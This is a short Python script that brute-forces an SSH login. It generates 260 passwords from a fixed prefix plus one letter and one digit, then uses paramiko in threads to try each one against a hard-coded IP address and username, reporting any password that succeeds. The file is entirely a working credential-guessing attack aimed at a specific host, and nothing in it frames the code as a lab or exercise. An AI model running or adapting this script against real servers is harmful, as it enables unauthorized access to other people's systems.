import string
import threading
import time
import sys
import paramiko

def generatePasswdList():
    mdp = "QNKruN"
    charList = "abcdefghijklmnopqrstuvwxyz"
    slen = len(charList)
    result = []
    for i in range(0, slen):
        for d in range(0, 10):
            concat = mdp + charList[i] + str(d)
            result.append(concat)
    return result

def connect(host, user, passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username=user, password=passwd) 
    except paramiko.AuthenticationException:
        print('login failed with ' + passwd)
    else:
        print('connection succeed !!! password is : ' + passwd)
    ssh.close()
    return

def main():
    passwdList = generatePasswdList()
    for i in range(0, len(passwdList)):
        print("Trying : " + passwdList[i])
        thread = threading.Thread(target=connect, args=("52.10.231.37", "ooghe", passwdList[i]))
        thread.start()
        time.sleep(1)

    sys.exit(0)

if __name__ == '__main__':
    main()
